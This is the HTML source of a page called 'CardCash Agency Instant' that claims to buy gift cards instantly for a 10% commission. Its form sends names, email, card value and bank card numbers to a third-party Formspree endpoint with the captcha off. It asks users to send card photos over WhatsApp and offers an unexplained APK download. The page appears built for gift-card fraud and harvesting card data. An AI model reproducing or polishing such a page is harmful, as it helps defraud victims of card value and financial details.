<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CardCash Agency Instant</title>

<style>
body{
margin:0;
font-family:Arial;
text-align:center;
background:linear-gradient(180deg,#1d4ed8,#22c55e);
min-height:100vh;
}

header{
background:#1d4ed8;
color:white;
padding:15px;
font-size:22px;
font-weight:bold;
display:flex;
justify-content:space-between;
align-items:center;
}

.lang img{
width:35px;
margin-left:5px;
cursor:pointer;
}

h1{color:white;margin-top:20px;}

.download{
display:inline-block;
background:#16a34a;
color:white;
padding:12px 20px;
border-radius:10px;
margin:15px;
font-size:18px;
text-decoration:none;
}

.cards img{width:70px;margin:10px;}

.counter{
background:white;
padding:15px;
margin:20px;
border-radius:15px;
font-size:20px;
font-weight:bold;
color:#16a34a;
}

/* FORM */
form{
background:#f5f5f5;
margin:20px auto;
padding:20px;
border-radius:15px;
max-width:400px;
display:flex;
flex-direction:column;
gap:10px;
}

input,select,button{
width:100%;
padding:14px;
border-radius:10px;
border:1px solid #ccc;
font-size:16px;
}

button{
background:#16a34a;
color:white;
border:none;
font-size:18px;
cursor:pointer;
margin-top:10px;
}

.upload{
border:2px dashed green;
padding:20px;
border-radius:10px;
margin:10px 0;
background:white;
text-align:left;
}

footer{
background:#1d4ed8;
color:white;
padding:20px;
margin-top:20px;
}

.whatsapp{
position:fixed;
bottom:25px;
right:25px;
background:#25D366;
width:65px;
height:65px;
border-radius:50%;
display:flex;
align-items:center;
justify-content:center;
box-shadow:0 4px 10px rgba(0,0,0,0.3);
z-index:1000;
}

.whatsapp img{
width:32px;
height:32px;
}
</style>

<script>
// paiement
function showPayment(){
let method=document.getElementById("payment").value;
document.getElementById("paypal").style.display="none";
document.getElementById("momo").style.display="none";
document.getElementById("orange").style.display="none";
document.getElementById("card").style.display="none";
if(method=="paypal") document.getElementById("paypal").style.display="block";
if(method=="momo") document.getElementById("momo").style.display="block";
if(method=="orange") document.getElementById("orange").style.display="block";
if(method=="card") document.getElementById("card").style.display="block";
}

// langue
function setLang(lang){
localStorage.setItem("lang",lang);
applyLang();
}

function applyLang(){
let lang = localStorage.getItem("lang") || navigator.language;

if(lang.startsWith("fr")){
document.getElementById("title").innerText="Nous achetons vos cartes cadeaux instantanément";
document.getElementById("clients").innerText="Plus de 1500 clients satisfaits";
document.getElementById("sell").innerText="Vendre ma carte";
document.getElementById("btn").innerText="Vendre";
}
else{
document.getElementById("title").innerText="We buy your gift cards instantly";
document.getElementById("clients").innerText="Over 1500 satisfied clients";
document.getElementById("sell").innerText="Sell my gift card";
document.getElementById("btn").innerText="Sell";
}
}

window.onload=applyLang;
</script>

</head>

<body>

<header>
<span>CardCash Agency Instant</span>

<div class="lang">
<img src="https://flagcdn.com/w40/fr.png" onclick="setLang('fr')">
<img src="https://flagcdn.com/w40/gb.png" onclick="setLang('en')">
</div>
</header>

<h1 id="title">We buy your gift cards instantly</h1>

<a class="download" href="app.apk" download>Download App</a>

<div class="cards">
<img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg">
<img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg">
<img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg">
<img src="https://upload.wikimedia.org/wikipedia/commons/8/83/Steam_icon_logo.svg">
</div>

<div class="counter" id="clients">Over 1500 satisfied clients</div>

<h2 id="sell">Sell my gift card</h2>
<p>10% commission</p>

<form action="https://formspree.io/f/xreyepdr" method="POST">
<input type="hidden" name="_captcha" value="false">

<input type="text" name="name" placeholder="Name" required>
<input type="text" name="firstname" placeholder="First name" required>
<input type="email" name="email" placeholder="Email" required>
<input type="number" name="value" placeholder="Card value" required>

<select name="payment" id="payment" onchange="showPayment()" required>
<option value="">Choose payment method</option>
<option value="paypal">PayPal</option>
<option value="momo">MoMo</option>
<option value="orange">Orange Money</option>
<option value="card">Bank card</option>
</select>

<div id="paypal" style="display:none"><input type="text" name="paypal" placeholder="PayPal payment link"></div>
<div id="momo" style="display:none"><input type="text" name="momo" placeholder="MoMo number"></div>
<div id="orange" style="display:none"><input type="text" name="orange" placeholder="Orange Money number"></div>
<div id="card" style="display:none"><input type="text" name="card" placeholder="Bank card number"></div>

<div class="upload">
⚠️ Envoyez la photo via WhatsApp après soumission
<input type="file" disabled>
</div>

<button type="submit" id="btn">Sell</button>
</form>

<footer>WhatsApp customer support : +13434473483</footer>

<a class="whatsapp" href="https://wa.me/13434473483">
<img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg">
</a>

</body>
</html>
